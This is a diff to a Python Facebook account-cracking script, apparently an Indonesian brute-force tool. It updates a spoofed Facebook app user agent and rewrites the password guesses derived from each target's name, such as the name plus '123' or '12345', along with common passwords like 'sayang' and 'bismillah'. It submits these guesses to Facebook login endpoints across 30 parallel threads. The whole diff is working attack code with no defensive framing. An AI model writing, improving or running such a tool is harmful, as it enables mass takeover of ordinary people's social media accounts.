@@ -699,7 +699,7 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
-            user_agent = 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
+            user_agent = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 
                'x-fb-connection-quality': 'EXCELLENT', 
@@ -805,12 +805,11 @@ class __crack__:
                         if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                             	raimuuu = [
                             		xz[0]+'123', xz[0]+'12345',
-					xz[0], 'sayang',
-					'bismillah',
+					'sayang', 'bismillah',
 			    	]
                         else:
                         	raimuuu = [
-                        		'123456', 'rahasia'
+                        		'123456'
                         	]
                         __yayanXD__.submit(self.__api__, bb[0], raimuuu)
                     except:
@@ -827,17 +826,35 @@ class __crack__:
             with YayanGanteng(max_workers=30) as (__yayanXD__):
                 for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
-                        bb = yntks.split('<=>')
+                       bb = yntks.split('<=>')
                         xz = bb[1].split(' ')
-                        if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
-                            	raimuuu = [
-                            		xz[0]+'123', xz[0]+'12345',
-					xz[0], 'sayang',
-					'bismillah',
-			    	]
+                        if len(xz) == 1:
+                            raimuuu = [
+                            	xz[0], xz[0]+'123', xz[0]+'1234',
+                            	xz[0]+'12345',
+                            ]
+                        elif len(xz) == 2:
+                        	raimuuu = [
+                        		xz[0], xz[0]+'123', xz[0]+'12345',
+                        		xz[1]+'123', xz[1]+'12345',
+                        	]
+                        elif len(xz) == 3:
+                        	raimuuu = [
+                        		xz[0], xz[0]+'123', xz[0]+'12345',
+                        		xz[1]+'123', xz[1]+'12345',
+                        		xz[2]+'123', xz[2]+'12345',
+                        	]
+                        elif len(xz) == 4:
+                        	raimuuu = [
+                        		xz[0], xz[0]+'123', xz[0]+'12345',
+                        		xz[1]+'123', xz[1]+'12345',
+                        		xz[2]+'123', xz[2]+'12345',
+                        		xz[3]+'123', xz[3]+'12345',
+                        	]
                         else:
                         	raimuuu = [
-                        		'123456', 'rahasia'
+                        		'sayang', 'anjing',
+                        		'bismillah', '123456'
                         	]
                         __yayanXD__.submit(self.__mbasic__, bb[0], raimuuu)
                     except:
@@ -856,15 +873,33 @@ class __crack__:
                     try:
                         bb = yntks.split('<=>')
                         xz = bb[1].split(' ')
-                        if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
-                            	raimuuu = [
-                            		xz[0]+'123', xz[0]+'12345',
-					xz[0], 'sayang',
-					'bismillah',
-			    	]
+                        if len(xz) == 1:
+                            raimuuu = [
+                            	xz[0], xz[0]+'123', xz[0]+'1234',
+                            	xz[0]+'12345',
+                            ]
+                        elif len(xz) == 2:
+                        	raimuuu = [
+                        		xz[0], xz[0]+'123', xz[0]+'12345',
+                        		xz[1]+'123', xz[1]+'12345',
+                        	]
+                        elif len(xz) == 3:
+                        	raimuuu = [
+                        		xz[0], xz[0]+'123', xz[0]+'12345',
+                        		xz[1]+'123', xz[1]+'12345',
+                        		xz[2]+'123', xz[2]+'12345',
+                        	]
+                        elif len(xz) == 4:
+                        	raimuuu = [
+                        		xz[0], xz[0]+'123', xz[0]+'12345',
+                        		xz[1]+'123', xz[1]+'12345',
+                        		xz[2]+'123', xz[2]+'12345',
+                        		xz[3]+'123', xz[3]+'12345',
+                        	]
                         else:
                         	raimuuu = [
-                        		'123456', 'rahasia'
+                        		'sayang', 'anjing',
+                        		'bismillah', '123456'
                         	]
                         __yayanXD__.submit(self.__mfb__, bb[0], raimuuu)
                     except:
